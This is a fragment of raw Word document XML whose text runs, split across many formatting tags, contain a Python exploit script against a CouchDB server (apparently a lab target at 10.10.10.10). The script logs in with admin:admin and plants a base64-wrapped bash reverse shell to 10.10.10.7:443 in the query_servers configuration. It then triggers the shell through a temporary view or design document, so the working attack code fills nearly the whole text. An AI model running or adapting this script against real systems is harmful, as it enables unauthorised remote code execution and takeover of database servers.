          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>requests.auth</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> import </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>HTTPBasicAuth</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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target = 'http://10.10.10.10:5984'</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command = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>rb</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sh</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> &gt;&amp; /dev/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>/10.10.10.7/443 0&gt;&amp;1"""</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version = 1</w:t>
      </w:r>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session = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>requests.session</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>()</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B935B8" w:rsidRPr="00B935B8" w:rsidRDefault="00B935B8" w:rsidP="00B935B8">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>session.headers</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> = {</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    'Content-Type': 'application/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>json</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>'</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w:t>
      </w:r>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print('hi')</w:t>
      </w:r>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proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>session.auth</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>HTTPBasicAuth</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>('admin', 'admin')</w:t>
      </w:r>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print(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>session.auth</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>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lastRenderedPageBreak/>
        <w:t>command = "bash -c '{</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>echo,%</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>}|{base64,-d}|{bash,-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>}'" % base64.b64encode(command).decode()</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if version == 1:</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    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>session.put</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>target + ('/_</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>config</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query_servers</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cmd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>'), data=</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>json.dumps</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(command))</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else:</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    host = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>session.get</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>target + '/_membership').</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>json</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all_nodes</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>'][0]</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    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>session.put</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>target + '/_node/{}/_</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>config</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query_servers</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cmd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>'.format(host), data=</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>json.dumps</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(command))</w:t>
      </w:r>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proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>session.put</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>target + '/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>wooyun</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>')</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B935B8" w:rsidRPr="00B935B8" w:rsidRDefault="00B935B8" w:rsidP="00B935B8">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>session.put</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>target + '/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>wooyun</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>/test', data='{"_id": "</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>wooyuntest</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>"}')</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B935B8" w:rsidRPr="00B935B8" w:rsidRDefault="00B935B8" w:rsidP="00B935B8">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pP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if version == 1:</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    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>session.post</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>target + '/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>wooyun</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>/_</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>temp_view?limit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>=10', data='{"language":"</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>cmd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>","map":""}')</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B935B8" w:rsidRPr="00B935B8" w:rsidRDefault="00B935B8" w:rsidP="00B935B8">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>else:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="002070FF" w:rsidRDefault="00B935B8" w:rsidP="00B935B8">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>session.put</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>target + '/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>wooyun</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>/_design/test', data='{"_</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>id":"_design</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test","views</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>":{"</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>wooyun</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>":{"map":""} },"language":"</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>cmd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B935B8">
        <w:rPr>
